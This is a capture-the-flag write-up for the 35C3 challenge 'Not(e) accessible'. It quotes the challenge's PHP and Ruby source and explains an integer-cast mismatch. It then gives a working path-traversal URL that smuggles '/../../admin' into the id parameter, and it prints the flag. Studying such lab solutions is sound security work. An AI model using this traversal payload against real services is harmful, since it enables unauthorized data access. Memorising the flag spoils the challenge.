# Not(e) accessible

>Solves: 130

>We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that's why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.

>Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable...

>http://35.207.132.47:90

>Difficulti estimate: Easy-Medium

## Analysis

Site allows us to create notes, which can only be accessed through randomly generated id and password.
Id and password are supplied through GET parameters like this:  http://35.207.132.47:90/view.php?id=-3352688426888026302&pw=47bce5c74f589f4867dbd57e9ca9f808
In HTML source there is comment ```<!-- My source is at /src.tgz -->```
After unpacking archive we can see 2 folders: frontend and backend.

Backend folder contains app.rb file, which discovers what goal of this challenge is:

```ruby
require 'sinatra'
set :bind, '0.0.0.0'

get '/get/:id' do
	File.read("./notes/#{params['id']}.note")
end

get '/store/:id/:note' do 
	File.write("./notes/#{params['id']}.note", params['note'])
	puts "OK"
end 

get '/admin' do
	File.read("flag.txt")
end
```

We somehow need to send /admin request to backend app.
Frontend folder contains view.php and index.php. Former being more interesting to us:

```php
<?php header("Content-Type: text/plain"); ?>
<?php 
    require_once "config.php";
    if(isset($_GET['id']) && isset($_GET['pw'])) {
        $id = $_GET['id'];
        if(file_exists("./pws/" . (int) $id . ".pw")) {
            if(file_get_contents("./pws/" . (int) $id . ".pw") == $_GET['pw']) {
                echo file_get_contents($BACKEND . "get/" . $id);
            } else {
                die("ERROR!");
            }
        } else {
            die("ERROR!");
        }
    }
?>
```

## Solution

On line where there is check whether requested note file exists it casts id parameter to integer then concatenates it with file parameter:
```php
if(file_exists("./pws/" . (int) $id . ".pw")) {
```
When type casting to int php takes part up to first nondigit character , so if id parameter was "123abc789" it would be converted to 123.
Problem with this is that same conversion is not applied when making request to the backend:

```php
echo file_get_contents($BACKEND . "get/" . $id);
```

So what we can do is create regular note which we can access so we know the id (e.g http://35.207.132.47:90/view.php?id=1891374512036838750&pw=2af54305f183778d87de0c70c591fae4)
then modify id parameter beyond digits so we request admin:
```http://35.207.132.47:90/view.php?id=-3352688426888026302%2f..%2f..%2fadmin&pw=47bce5c74f589f4867dbd57e9ca9f808```

"/" had to be url encoded cause otherwise browser would mistake it for new directory (therefore %2f).

35C3_M1Cr0_S3rvices_4R3_FUN!
